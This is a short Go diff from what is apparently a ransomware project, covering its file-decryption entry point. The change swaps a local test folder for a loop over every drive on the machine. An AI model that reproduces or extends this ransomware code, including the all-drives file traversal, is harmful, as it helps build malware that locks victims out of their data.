@@ -4,7 +4,6 @@ import (
 	"crypto/ecdsa"
 	"fmt"
 	"io/fs"
-	"os"
 	"path/filepath"
 	"ransomware/encryption"
 	"ransomware/encryption/eccLib"
@@ -15,8 +14,7 @@ import (
 )
 
 var (
-	filesToVisit = make(chan io.File)
-	waitGroup    sync.WaitGroup
+	waitGroup sync.WaitGroup
 )
 
 func main() {
@@ -28,20 +26,21 @@ func main() {
 		panic(err)
 	}
 
-	currentDirectory, _ := os.Getwd()
-	dir := string(filepath.Dir(currentDirectory) + "/testFolder")
+	// currentDirectory, _ := os.Getwd()
+	// dir := string(filepath.Dir(currentDirectory) + "/testFolder")
 
-	decryptFiles(dir, privKeys)
+	// decryptFiles(dir, privKeys)
 
-	// drives := io.GetDrives()
-	// for _, drive := range drives {
-	// 	decryptFiles(drive, privKey)
-	// }
+	drives := utils.GetDrives()
+	for _, drive := range drives {
+		decryptFiles(drive, privKeys)
+	}
 
 }
 
 func decryptFiles(dirPath string, privKeys []*ecdsa.PrivateKey) {
 
+	var filesToVisit = make(chan io.File)
 	var ext string
 	waitGroup.Add(1)
 	go func() {
